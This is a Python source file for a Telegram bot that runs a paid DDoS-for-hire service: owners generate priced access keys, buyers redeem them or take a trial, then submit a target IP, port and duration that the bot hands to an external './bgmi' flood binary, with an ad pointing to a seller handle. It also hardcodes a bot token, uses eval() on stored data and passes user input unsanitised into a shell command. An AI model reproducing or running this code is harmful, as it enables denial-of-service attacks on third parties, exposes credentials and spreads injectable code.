import hashlib
import os
import telebot
import asyncio
import logging
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread
import random
import string

loop = asyncio.get_event_loop()
TOKEN = '8178780296:AAEyXjPiQcczYMKq9NQkZ_IP0YaQ4Qh31rk'
bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

OWNER_IDS = [7468235894, 6404882101, 6902791681]

USERS_FILE = 'users.txt'
USED_KEYS_FILE = 'used_keys.txt'
KEYS_FILE = 'keys.txt'
TRIAL_USERS_FILE = 'trial_users.txt'

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
running_processes = []

# Plan mapping
duration_price_map = {
    '1hour': 10,
    '2hour': 19,
    '3hour': 25,
    '1day': 99,
    '2days': 149,
    '3days': 199,
    '4days': 249,
    '5days': 299,
    '6days': 349,
    '7days': 399
}

def generate_random_key(prefix):
    suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    return f"{prefix.upper()}-{suffix}"

@bot.message_handler(commands=['key'])
def generate_key(message):
    user_id = message.from_user.id
    if user_id not in OWNER_IDS:
        bot.send_message(message.chat.id, "*You are not authorized to generate keys.*", parse_mode='Markdown')
        return

    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, "*Use like: /key 1hour*", parse_mode='Markdown')
        return

    duration_name = args[1].lower()
    if duration_name not in duration_price_map:
        bot.send_message(message.chat.id, "*Invalid plan. Use 1hour, 1day, etc.*", parse_mode='Markdown')
        return

    price = duration_price_map[duration_name]
    key = generate_random_key(duration_name)
    full_key = f"{price}-{key}"

    with open(KEYS_FILE, 'a') as f:
        f.write(f"{full_key}\n")

    bot.send_message(message.chat.id, f"*Key generated:*\n`{full_key}`", parse_mode='Markdown')

async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./bgmi {target_ip} {target_port} {duration} 1300"
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        running_processes.append(process)
        stdout, stderr = await process.communicate()
        if stdout:
            logging.info(f"Command output: {stdout.decode()}")
        if stderr:
            logging.error(f"Command error: {stderr.decode()}")
    except Exception as e:
        logging.error(f"Error: {e}")
    finally:
        if process in running_processes:
            running_processes.remove(process)

async def run_attack_command_async(target_ip, target_port, duration):
    await run_attack_command_on_codespace(target_ip, target_port, duration)

def is_user_approved(user_id):
    if user_id in OWNER_IDS:
        return True
    if not os.path.exists(USED_KEYS_FILE):
        return False
    with open(USED_KEYS_FILE, 'r') as file:
        for line in file:
            data = eval(line.strip())
            if data['user_id'] == user_id:
                expiry = datetime.fromisoformat(data['valid_until'])
                if datetime.now() <= expiry:
                    return True
    return False

def send_buy_message(chat_id):
    msg = (
        "😈😈 *NEW BOT READY* 😈😈\n"
        "*FEATURES* 🎉😈🚀\n"
        "TIME 1000S +✅\n"
        "1 MATCH MULTIPLE ATTACKS🚀\n"
        "❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️\n"
        "1 MATCH TRIAL FREE 🥳\n\n"
        "*PRICE LIST*👇\n"
        "⏳1 HOUR = 10✅\n"
        "⏳2 HOUR = 19✅\n"
        "⏳3 HOUR = 25✅\n"
        "⏳1 DAY = 99✅\n"
        "⏳2 DAYS = 149✅\n"
        "⏳3 DAYS = 199✅\n"
        "⏳4 DAYS = 249✅\n"
        "⏳5 DAYS = 299✅\n"
        "⏳6 DAYS = 349✅\n"
        "⏳7 DAYS = 399✅\n\n"
        "BUY DM 👉 @Darknetdon1"
    )
    bot.send_message(chat_id, msg, parse_mode='Markdown')

@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    bot.send_message(message.chat.id, "*Send your key to activate access.*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    key = message.text.strip()
    user_id = message.from_user.id

    if not os.path.exists(KEYS_FILE):
        bot.send_message(message.chat.id, "*No keys available.*", parse_mode='Markdown')
        return

    with open(KEYS_FILE, 'r') as file:
        valid_keys = [line.strip() for line in file if line.strip()]

    if key not in valid_keys:
        bot.send_message(message.chat.id, "*Invalid key.*", parse_mode='Markdown')
        return

    with open(KEYS_FILE, 'w') as file:
        for k in valid_keys:
            if k != key:
                file.write(f"{k}\n")

    duration_map = {
        10: 1/6, 19: 2/6, 25: 3/6, 99: 1,
        149: 2, 199: 3, 249: 4, 299: 5, 349: 6, 399: 7
    }
    try:
        plan_price = int(key.split('-')[0])
        duration_days = duration_map.get(plan_price, 1)
    except:
        duration_days = 1

    valid_until = (datetime.now() + timedelta(days=duration_days)).isoformat()
    data = {'user_id': user_id, 'valid_until': valid_until, 'key': key}

    with open(USED_KEYS_FILE, 'a') as file:
        file.write(f"{data}\n")

    bot.send_message(message.chat.id, "*Access granted successfully!*", parse_mode='Markdown')

@bot.message_handler(commands=['cancel_key'])
def cancel_key_command(message):
    if message.from_user.id not in OWNER_IDS:
        return
    bot.send_message(message.chat.id, "Send key to cancel:")
    bot.register_next_step_handler(message, process_cancel_key)

def process_cancel_key(message):
    key = message.text.strip()
    updated_keys = []
    with open(USED_KEYS_FILE, 'r') as file:
        updated_keys = [eval(line.strip()) for line in file if eval(line.strip())['key'] != key]
    with open(USED_KEYS_FILE, 'w') as file:
        for item in updated_keys:
            file.write(f"{item}\n")
    with open(KEYS_FILE, 'a') as file:
        file.write(f"{key}\n")
    bot.send_message(message.chat.id, "*Key cancelled successfully!*", parse_mode='Markdown')

@bot.message_handler(commands=['trial'])
def trial_command(message):
    user_id = message.from_user.id
    if user_id in OWNER_IDS:
        bot.send_message(message.chat.id, "*You already have full access.*", parse_mode='Markdown')
        return
    if os.path.exists(TRIAL_USERS_FILE):
        with open(TRIAL_USERS_FILE, 'r') as file:
            for line in file:
                if str(user_id) == line.strip():
                    bot.send_message(message.chat.id, "*You have already used your free trial.*", parse_mode='Markdown')
                    return
    expiry = datetime.now() + timedelta(minutes=10)
    with open(USED_KEYS_FILE, 'a') as file:
        file.write(f"{{'user_id': {user_id}, 'valid_until': '{expiry.isoformat()}', 'key': 'trial'}}\n")
    with open(TRIAL_USERS_FILE, 'a') as file:
        file.write(f"{user_id}\n")
    bot.send_message(message.chat.id, "*10-minute trial activated!*", parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    btn1 = KeyboardButton("Start Attack")
    btn2 = KeyboardButton("My Account")
    btn3 = KeyboardButton("Buy Key")
    btn4 = KeyboardButton("Trial")
    markup.add(btn1, btn2, btn3, btn4)
    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    if message.text == "Start Attack":
        if not is_user_approved(user_id):
            send_buy_message(message.chat.id)
            return
        bot.send_message(message.chat.id, "Send IP, port, duration:")
        bot.register_next_step_handler(message, process_attack)
    elif message.text == "My Account":
        if not is_user_approved(user_id):
            send_buy_message(message.chat.id)
            return
        expiry = "Unknown"
        with open(USED_KEYS_FILE, 'r') as file:
            for line in file:
                data = eval(line.strip())
                if data['user_id'] == user_id:
                    expiry = data['valid_until']
        bot.send_message(message.chat.id, f"*User ID:* {user_id}\n*Valid Until:* {expiry}", parse_mode='Markdown')
    elif message.text == "Buy Key":
        send_buy_message(message.chat.id)
    elif message.text == "Trial":
        trial_command(message)
    else:
        bot.send_message(message.chat.id, "*Invalid option. Choose from menu.*", parse_mode='Markdown')

def process_attack(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid format. Use: IP PORT TIME*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked.*", parse_mode='Markdown')
            return
        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*Attack started on {target_ip}:{target_port} for {duration}s!*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in attack: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread)
    asyncio_thread.start()
    bot.polling(none_stop=True)